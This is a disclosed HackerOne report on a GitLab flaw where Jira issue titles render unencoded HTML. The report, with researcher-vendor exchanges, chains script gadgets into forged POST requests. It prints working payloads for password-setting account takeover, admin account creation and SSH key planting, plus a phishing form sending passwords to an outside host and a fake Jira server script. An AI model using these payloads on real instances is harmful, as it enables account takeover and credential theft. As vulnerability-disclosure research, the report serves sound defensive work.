---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/resource-injection
  - env/web
  - stack/gitlab
substate: "resolved"
weakness: "Resource Injection"
enriched: true
body: true
date: 2022-09-22
submitted: 2022-04-07T14:23:04.212Z
bounty_usd: null
votes: 55
cve: "CVE-2022-1940"
program: "[[programs/gitlab|GitLab]]"
reporter: "joaxcar"
source: "https://hackerone.com/reports/1533976"
title: "Content injection in Jira issue title enabling sending arbitrary POST request as victim"
---
# Content injection in Jira issue title enabling sending arbitrary POST request as victim

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 55 | **Program:** GitLab | **Disclosed:** 2022-09-22

- Report: [https://hackerone.com/reports/1533976](https://hackerone.com/reports/1533976)
- CWE: Resource Injection | CVE: CVE-2022-1940
- Submitted: 2022-04-07T14:23:04.212Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary

The issue described here leads to the same outcome as my previous report, https://hackerone.com/reports/1409788 . So look into that one for further details on the JavaScript gadgets. Also see my report https://hackerone.com/reports/1481207 for a detailed rundown of injections in GitLab.

This time it is the `title` field of Jira issue pages that renders without proper HTML encoding. Leading to HTML and CSS injection. By abusing a script gadget and a browser quirk (tested on Chrome and Firefox) the injection can be escalated into a highly dangerous arbitrary POST request. Depending on the payload, this POST request can lead to account takeover(of OAuth/SAML accounts) and also generation of admin accounts giving full access to the whole instance.

For the H1 triager it is OK to skip to the POC as the description will contain a lot of GitLab specifics.

## Background
There is a premium feature in GitLab where a user can connect a project with a Jira tracker. See https://docs.gitlab.com/ee/integration/jira/ . When this is set up there will be a path in the project like so: https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues where any tasks created in Jira will be automatically fetched and presented to the members of the project.

Giving a task in Jira a title containing HTML will (if the Jira integration is set up in the project) generate an Jira issue in GitLab with the same title. When viewing the Jira issue details page (https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/ISO-1) this title field will be displayed without proper HTML encoding and thus render the supplied HTML. The caveat here is that this HTML will be sanitized by DOMPurify as it is added through the Vue `v-safe-html` attribute.

But as I have shown in my previous reports, there exists some JavaScript gadgets that slips through DOMPurify in your current default settings.

If you reed my other reports you can also see that there exists a gadget leading to full XSS, this do require the injected data to be present in the page on initial load. In this case, the data is fetched in a subsequent request and thus miss the first run through main.js

When a detail page for a Jira issue is first visited, the call for the issue data is actually too slow to hit the second tier of JavaScript gadgets (the code inside defered_execution in main.js). But I found a way to bypass this. When a browser leaves a page to visit another page, and then uses History.back (or the back button in the browser) the browser will not generate a complete rerun of the previous requests. It will instead use cached data, even for the data that is not supposed to be cached. So I found out that visiting a infected Jira issue page, browsing away from the page, and then clicking the back button to get to the Jira issue again, will speed up the data call to have it hit by the deferred part of main.js

To weaponize this, all we need is to first navigate away from the page to a server that just runs `History.back()` to directly redirect the user back to the malicious issue page and the payload will now trigger. All this can be made almost guarantied as the injection also allows for arbitrary CSS to be loaded. This makes it possible to craft a page that have an overlay link that will trigger on clicking anywhere.

## The payload
I will present two payloads that will show the potential damage from this attack.

There exists a limitation as for the injection, as Jiras tasks have a 255 letter limit. This is not much to work with, but with some trix we can still get both account takeover and admin creation to work inside this payload.

First of we have a payload that will be able to perform account takeovers on accounts that do not have a password set. This is all OAuth registered accounts (and as far as I understand also SAML and maybe LDAP accounts). These accounts have an auto generated (strong! As of 14.9.2) password after the user signs up with, for example "sign in with GitHub". If the user does not actively go to `/profile/password/edit` and add a new password, the account is vulnerable to this attack. The password update page does not require "current password" before an initial password has been set. The payload looks like this
```
<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
```
If we pull this apart, we have
```
<a 
  href=http:j15.se <--- a site that when visited just throws the user back, saving some chars by omiting slashes
  class=js-feature-highlight <--- the classname to be used as a gadget
  data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'
  ^--- The payload where the POST request will get sent
  >
.</a> <--- close the anchor tag
<style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
  ^--- Unlimited styling to make the website a bulletproof click machine :)
```
This will generate a link covering the whole screen. When clicked (by clicking anywhere) the browser will go to http://j15.se which is a site that directly throws the user back to where it came from. This time, the browser will fetch the data from its cache and thus make the main.js hit the payload. The user will now have to click the page again to actually send the payload. It is two required clicks, but as we have full CSS control we can make it almost guarantied that a user will try to click somewhere on our page.

When the payload have fired, the OAuth user will have a new password. The user will be logged out but nothing else will point to the password having been set. Account takeover complete!


This payload will add a new administrator to the instance if an administrator visits the malicious page
```
<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/api/v4/users?admin=true&email=j@j15.se&name=h&username=hack&password=12345678&skip_confirmation=true'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
```
Pulled apart
```
<a href=http:j15.se
  class=js-feature-highlight
  data-dismiss-endpoint='/api/v4/users?admin=true&email=j@j15.se&name=h&username=hack&password=12345678&skip_confirmation=true'>
.</a>
<style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
```


## Steps to reproduce

This requires three things:
1. access to a premium subscription (no problem on GitLab.com as there are free trials, they work great for the attack)
2. a Jira server. I used a cloud Jira instance on atlassian.com
3. a third party account that is not registered on GitLab. ex a GitHub user

POC:
1. Create a user `attacker`
2. Log in as `attacker` and create a group `attack_group` by visiting https://gitlab.com/groups/new (make sure the group have premium access)
3. Create a new project in the group called `attack_proj`
4. Go to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/edit
5. Follow the guide at https://docs.gitlab.com/ee/integration/jira/issues.html#view-jira-issues to enable viewing Jira issues in the project
6. Log in to Jira and create a task on the dashboard and name it `<img src=#>`
7. Go to https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues and make sure the task is shown as an issue
8. Click the issue to open the Issue details page. The title will render as a broken image. This proves the injection.

{F1683460}

9. Now go back to Jira and create a new task and name it
```
<a href=http:j15.se class=js-feature-highlight data-dismiss-endpoint='/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678'>.</a><style>@import '/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css
```
10. Go back to the issue list and refresh to make sure it is created
11. Now log in to GitLab.com with a third party provider, generating a new account on GitLab.com
12. (if the test project is not public invite the new user to the project as a Developer by visiting https://gitlab.com/atack_group/attack_proj/-/project_members)
13. Now visit the https://gitlab.com/attack_group/attack_proj/-/integrations/jira/issues list with the OAuth user and click the task with the payload
14. A page will show up looking empty, click anywhere on the page
15. The page will flicker, and now when you hover over the page it will show a big blue button stating "Got it!". Click it

{F1683461}

16. Refresh the page, you should now be logged out from GitLab.com
17. Log in with the OAuth email and the password `12345678`

Account takeover!

Important to note here is that the second click on the blue button can be made invisible as the first click. I did not want to spend my whole day in CSS but can get back with it if needed! :)

## Impact

HTML and CSS injection in Jira issue page can make POST request as victim user. Can lead to account takeover or admin user escalation.

## What is the current *bug* behavior?

The name/title field in the Jira issue page is not sanitized

## What is the expected *correct* behavior?

The name should be shown sanitized

## Output of checks

This bug happens on GitLab.com

## Impact

Account takeover and admin user creation through arbitrary POST request in Jira issue

## Timeline

- **Report Filed**
- **2022-04-07** @joaxcar: A TL/DR of the attack complexity:

The victim needs to:
1. Visit the issue page
2. Click anywhere on the page (including menus and sidebars)
3. Click anywhere on the page again

It might sound like a lot (hence the HIGH on complexity). But going through the steps myself, it does feel like I would have been easily fooled :)

The same injection vector can also be used as a phishing page, similar to my report https://hackerone.com/reports/1362405
This was my initial idea, but the arbitrary POST attack is much more dangerous!

Best regards
Johan
- **2022-04-07** @joaxcar: Here is a short video of the account takeover POC.

In the video you can see my Google account gaining the password 12345678 on GitLab.com by visiting a jira issue

{F1684016}
- **2022-04-07** @joaxcar: And finally. A small phishing POC. The text in this popup is related to pipelines, but you get the concept! One would just change the text to something more related to Jira. The text is generated by the CSS file, that's why I did not bother to change it :)

It tries to mimic "merge request approval" popups, which are a real thing in GitLab

payload
```
<div id="u"><form action="https://joaxcar.com" method="POST"><div></div><div><input placeholder="Password" type="password" name="x"></div><div><button>Approve<style>@import "/api/v4/projects/30205462/jobs/2304158115/artifacts/a.css"
```

{F1684031}
- **2022-04-08** @joaxcar: I think that I have located the root of this issue.

The Jira issue details page is just reusing the base `issuable/show` Vue component [link](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/vue_shared/issuable/show/components). This component renders the title of the `issue` in the file [/app/assets/javascripts/vue_shared/issuable/show/components/issuable_title.vue](https://gitlab.com/gitlab-org/gitlab/-/blob/master/app/assets/javascripts/vue_shared/issuable/show/components/issuable_title.vue).

The lines responsible for displaying the title looks like this
```ruby
      <h1
        v-safe-html="issuable.titleHtml || issuable.title"
        class="title qa-title"
        dir="auto"
        data-testid="title"
      ></h1>
```

The interesting part is line 2 in this listing. This works great for regular `issuables` that always stores unescaped content in `title` and escaped content in `titleHtml`. The issue is how the task data from Jira is mapped to a GitLab `issuable`. This happens in [/ee/app/serializers/integrations/jira_serializers/issue_entity.rb](https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/app/serializers/integrations/jira_serializers/issue_entity.rb). Here the `title` of the new `issuable` is mapped directly from the Jira `summary` without encoding
```ruby
      expose :title do |jira_issue|
        jira_issue.summary
      end
```
As no `titleHtml` is generated the unencoded `title` will be used in the Vue file.

As an example the other issue integration [ZenTao](https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/app/serializers/integrations/zentao_serializers/issue_entity.rb) does this in its mapping
```ruby
      expose :title do |item|
        sanitize(item['title'])
      end
```
Here the `title` is sanitized and thus not vulnerable

Hope this can help to mitigate the issue!

Best regards
Johan
- **2022-04-11** @joaxcar: I have found a small escalation of the reported issue. Now allowing for true arbitrary POST request and "safe" HTML injection. Bypassing the initial limitation of 255 characters. And making the POC and attack a lot easier to reproduce.

## Unlimited injection
As it turns out there is really no check that the endpoint registered as the JIRA server is actually a JIRA server (might be hard to check anyway). And the limitation of 255 characters was enforced by JIRAs service. It appears that this limitation does not exist on the GitLab side on the JIRA issue model. Hence, we can fake a JIRA server by just serving up correct JSON as a response to the API request from GitLabs backend when a user asks to view a JIRA issue.

When a user visits a link such as https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/ISSUE-1 on a project which have enabled JIRA issues, there is a request made from the backend to this endpoint

```
https://JIRASERVER/rest/api/2/issue/ISSUE-1?&expand=renderedFields
```

where JIRASERVER is the server configured in the projects `integrations`. A real JIRA server gives quite a verbose answer to this request, and some parts of this answer is subsequently mapping the result to an `issuable`.

By setting up a server responding with a similar request the attacker can generate responses with an arbitrary long payload in the "summary" field, used as title in GilLab.

I will attach a sample JSON response to this posting, but you can also view it here: https://joaxcar.com/resth/test4.json
Search for "summary" in the JSON data to see the payload

## Better attack
First of this opens up for full control over the attack for the attacker. As length is no longer a problem, ALL post requests are now possible. There is also no limit on the amount of injected tags or styling. This also opens up for a "Stacked POST requests" attack as I have described in an earlier report where the infected page can be made to perform a series of POST requests by stacking full page links on top of each other. I will have a POC of this further down. If the user makes 4 clicks on the page, there will be 3 POST requests made with different payloads

The ability to serve any response to the request from GitLab also allows the attacker to make the payload dynamic. The "SSH KEY" planting attack described in my report 1409788 can thus be made to never serve the same SSH key twice. If two users visits the same malicious page they will have two different KEYs in their respective payload!

## POC
To take advantage of this new improved attack for testing you can use my server. Steps:

1. Log in as the attacker
2. Create a project (with premium enabled) 
3. Go to /-/integrations/jira/edit
4. Fill in server: `https://joaxcar.com` , username and password can be whatever
5. Click "enable JIRA issues"
6. Now go to any of the following links (replace group and project name):

https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/HACKER1

https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/HACKER2

https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/HACKER3

https://gitlab.com/GROUPNAME/PROJECTNAME/-/integrations/jira/issues/HACKER4

HACKER1 - add SSH key
HACKER2 - create admin account
HACKER3 - change user password
HACKER4 - All three from above. Click 4 times

All attacks work on all GitLab instances, as all links are without root path in the payloads.

The SSH Key attack will add a valid SSH key to your account. To be able to reuse the POC you have to go to

https://gitlab.com/-/profile/keys

and remove the key named Hacker when done testing. The key can only exist on one account at the time. And I have not made my server generate dynamic SSH keys for this POC.

## Conclusion
The attack is now without payload limit and way easier to reproduce. I don't know if this is enough to lower attack complexity from HIGH to LOW. Your CVSS calculator states for HIGH

>   Knowledge of a private project name is required to carry out the attack
>   A certain setting has to have a non-default value to make the attack possible
>   Exploitation depends on a specific timing and cannot always be reproduced 

I guess it is the last one that matters, as the first ones are not applicable. As the attack works now, there is no dependency on timing or other limitations, apart from the limitation that the victim needs to perform more than one click (minimum 2 for successful attack). And that all payloads are not effective against all users. The SSH attack works on all users 100% success rate, the password account takeover is effective on users that have not set a password, and the admin attack is only viable against admins. But then there is multiple more attacks that are possible, like payloads targeted at making specific projects public, inviting users to private projects and so on.

If you need any more information please just reach out!

Best regards
Johan

Edit. My server have these rewrite rules for requests:
```
RewriteCond %{REQUEST_URI} ^/rest/api/2/issue/HACK1
RewriteRule .* https://joaxcar.com/resth/test.json [L,R=302]
RewriteCond %{REQUEST_URI} ^/rest/api/2/issue/HACK2
RewriteRule .* https://joaxcar.com/resth/test2.json [L,R=302]
RewriteCond %{REQUEST_URI} ^/rest/api/2/issue/HACK3
RewriteRule .* https://joaxcar.com/resth/test3.json [L,R=302]
RewriteCond %{REQUEST_URI} ^/rest/api/2/issue/HACK4
RewriteRule .* https://joaxcar.com/resth/test4.json [L,R=302]
```
- **2022-04-11** @h1_analyst_kenny: Hey @joaxcar,

I was looking at your other report just now and realized I never mentioned that we already reviewed this report.

We reviewed this report and forwarded this to the GitLab team on Friday and will provide you with an update whenever possible.

Thanks,
@long_cat
- **2022-04-12** @joaxcar: Thanks for the update @long_cat ! Sounds great

Best regards
Johsn
- **2022-04-13** @joaxcar: Just noticed that I had mixed up my latest comment about my "fake Jira server". I mention both

https://joaxcar.com/rest/api/2/issue/HACKER1
and
https://joaxcar.com/rest/api/2/issue/HACK1

I have added both to my `.htaccess` file now, so any of the patters work. Sorry if it confused anything during testing
- **2022-04-13** @akelly: Thanks for submitting this report, @joaxcar! I've started working to reproduce this finding.

It looks like the `data_example.json` file is invalid JSON. Is there any chance you could take a look and see if you spot what might be wrong? I'm going to spend more time on it tomorrow and can probably get it figured out via some beautifiers/linters, but I thought I'd ask just in case you were able to find it in the meantime.

Thanks and have a great day,
Andrew
Security Team | GitLab
- **2022-04-14** @joaxcar: Hi @akelly thanks for looking into the report! And great to see you here at H1 again, our roads have not crossed here for a while :)

I cant find anything wrong with the data in the example file. At what stage is it giving you an error?

What I can think of is that you probably need to serve it with a correct mime-type (`application/json`) to get GitLab to accept it as an API response. I just hosted the file on my regular hosting provider. Links

https://joaxcar.com/rest/api/2/issue/HACK1

https://joaxcar.com/rest/api/2/issue/HACK2

https://joaxcar.com/rest/api/2/issue/HACK3

https://joaxcar.com/rest/api/2/issue/HACK4

This will respond with the correct mime-type (and encode the payload in Base64 as it semes)

To mimic this locally you can run a modified version of the Python basic HTTP server. Create a file `server.py` containing
```python
from os import path
import http.server
import socketserver

PORT = 8080
dir = path.abspath(path.dirname(__file__))

class HttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET( self ):
        self.send_response(200)
        self.send_header( 'Content-type', 'application/json' )
        self.end_headers()
        self.wfile.write( self.getContent(self.getPath()) )

    def getPath(self):
        return path.join(dir, 'data_example.json')

    def getContent(self, content_path):
        with open(content_path, mode='r', encoding='utf-8') as f:
            content = f.read()
        return bytes(content, 'utf-8')

httpd = socketserver.TCPServer(("localhost", PORT), HttpRequestHandler)

try:
    print(f"serving at http://localhost:{PORT}")
    httpd.serve_forever()
except KeyboardInterrupt:
    pass
```
and put this file in the same directory as the example data files you want to serve.
```
/
   server.py
   data_example.json
```
then run
```sh
python3 ./server.py
```
Visiting http://localhost:8080/ANYPATH should now present you with a valid JSON response. The server returns the same file for all requests so it will answer correctly for /rest/api/2/issue/KEY

The payload is present in the `summary` field of the JSON. (not the empty one, there are two summary fields). And my last example HACK4 contains a concatenation of all three attacks like so
```json
summary: "<a href=http://j15.se class=\"js-feature-highlight\" style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1005\">.</a><div class=\"js-new-user-signups-cap-reached\"  data-dismiss-endpoint=\"/-/profile/password?_method=put&user%5Bnew_password%5D=12345678&user%5Bpassword_confirmation%5D=12345678\" data-feature-id=\"1\"><a href=\"https://joaxcar.com\" style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1004\" class=\"js-close deferred-link\">.</a></div><div class=\"js-users-over-license-callout\" data-dismiss-endpoint=\"/api/v4/user/keys?title=hack&key=ssh-ed25519%20AAAAC3NzaC1lZDI1NTE5AAAAIDpz7b7pozVlAnzLfWhrAB7wUAPce0KcfY9ZsS4TIpkW%20jcar@MINDARO\" data-feature-id=\"2\"><a href=\"https://joaxcar.com\" style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1002\" class=\"js-close\">.</a></div><div class=\"js-recovery-settings-callout\"  data-dismiss-endpoint=\"/api/v4/users?admin=true&email=joaxcar@wearehackerone.com&name=newadmin&username=newadmin&password=asdasdasdasd&skip_confirmation=true\" data-feature-id=\"3\"><a href=\"https://joaxcar.com\" style=\"background-color: rgba(0, 0, 0, 0); border: 0; cursor: default; height: 100%; left: 0; position: absolute; top: 0; width: 100%; z-index: 1000\" class=\"js-close deferred-link\">.</a></div>"
```
To simplify testing you could just replace this part with
```json
summary: "<img src=#>"
```
to get a broken image as the issue title.


I hope this will sort things out. Otherwise, just get back with more details on what is breaking, and I will try to help the best I can!

(and a final note. Whenever testing with the SSH-key injection payload. Make sure to go to the user profile and remove the key after a successful attack, as the key can only be added to one user account at a time!)
- **Report Triaged**
- **Bounty Awarded**
- **2022-04-21** @gitlab-securitybot: ETA for fix:

Hi @joaxcar,

The issue you reported is currently scheduled to be fixed by 2022-06-30.

Thank you again for contacting us!

Best regards,
GitLab Security Team
- **2022-04-27** @joaxcar: Hi again @akelly thank you for triaging this!

Just wanted to add some last tidbits regarding impact. Don't know if it matters for CVSS, but might add some understanding of the scope of the bug.

In a worst case scenario here, an attacker would be able to attack a GitLab "unauthenticated". The attacker would need access to the Jira project, but this would be enough to be able to pull of the initial (length restricted) attack from my original report. This would enable for a user with access to Jira to penetrate into a locked down GitLab instance.

This also extends to the impact when using this as an attack on victim owned projects, where the attacker is able to create Jira issues.

So there is essentially two attack paths, requiring different levels of access:

1. A user have access to create Issues in a Jira project that is connected to a GitLab project. In this case the attacker can only use the limited payloads but does not need ANY access to the GitLab instance. (I dont know if this is enough to lower the CVSS priv req to `None` as the user still needs access to the Jira project) 

2. An attacker creates his/her own project (or gains maintainer access to a project) and is thus in control of the Jira settings. Now the attacker can use the "extended payloads" with full impact. This does require access to the GitLab instance.

Best regards
Johan
- **2022-04-27** @akelly: Hello @joaxcar,

Thanks for following up! We always appreciate the thorough and thoughtful information that you provide.

Having those two attack paths through different access levels clearly defined is helpful. I'll be sure that we take those into account when considering the severity of this report.

Have a great day!
Andrew
Security Team | GitLab
- **Cve Id Added**
- **Report Resolved**
- **Bounty Awarded**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
